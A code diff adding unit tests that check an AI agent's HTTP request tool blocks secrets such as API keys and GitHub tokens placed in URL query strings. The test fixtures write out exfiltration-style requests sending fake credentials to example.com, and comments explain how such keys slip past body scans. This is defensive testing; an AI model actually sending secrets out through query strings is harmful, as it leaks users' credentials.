@@ -857,6 +857,46 @@ describe('httpRequestTool', () => {
     });
   });
 
+  // The URL/query is an egress surface just like headers + body — a bare key
+  // smuggled into the query exfiltrates on every method, and (unlike the body
+  // scan) rides GET too. detectGetExfiltration's heuristics don't catch a bare
+  // key whose own `-`/`_` chars break the base64 run, so scan the URL for the
+  // explicit secret patterns.
+  describe('egress control: request URL secret blocking', () => {
+    it('blocks GET with an API key in the query string', async () => {
+      mockDnsPublic();
+      const result = await handler({
+        url: 'http://example.com/collect?token=sk-ant-api03-abc123def456ghi789jkl012mno345pqr678',
+      }, makeAgent());
+      expect(result).toContain('Blocked');
+      expect(result).toContain('URL');
+      expect(result).toContain('Anthropic API key');
+    });
+
+    it('blocks POST with a key in the query even when the body is clean', async () => {
+      // The body scan alone would miss this — the secret is in the URL, not the body.
+      mockDnsPublic();
+      const result = await handler({
+        url: 'http://example.com/api?leak=ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghij',
+        method: 'POST',
+        body: JSON.stringify({ message: 'hello world' }),
+      }, agentWithPromptFn());
+      expect(result).toContain('Blocked');
+      expect(result).toContain('URL');
+      expect(result).toContain('GitHub personal access token');
+    });
+
+    it('allows a normal URL with a long but non-secret path', async () => {
+      mockDnsPublic();
+      const mockResp = createMockResponse({ body: 'ok' });
+      vi.stubGlobal('fetch', vi.fn().mockResolvedValue(mockResp));
+      const result = await handler({
+        url: 'http://example.com/api/v2/resources/00000000-1111-2222-3333-444455556666/items',
+      }, makeAgent());
+      expect(result).toContain('HTTP 200');
+    });
+  });
+
   describe('egress control: GET exfiltration detection', () => {
     beforeEach(() => {
     });
